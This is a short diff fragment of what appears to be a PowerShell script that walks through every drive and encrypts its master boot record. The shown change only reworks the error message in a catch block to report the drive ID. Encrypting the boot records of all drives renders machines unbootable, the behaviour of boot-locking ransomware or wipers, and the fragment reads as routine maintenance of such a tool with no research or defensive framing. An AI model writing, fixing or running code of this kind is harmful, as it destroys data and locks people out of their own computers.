@@ -36,7 +36,7 @@ foreach ($drive in $drives) {
         Write-Host "Successfully encrypted MBR on $($drive.DeviceID)"
 
     } catch {
-        throw "Failed to process $diskPath - $_"
+        throw "Failed to process $($drive.DeviceID) - $_"
     } finally {
         # Close the file stream
         if ($fs) { $fs.Dispose() }
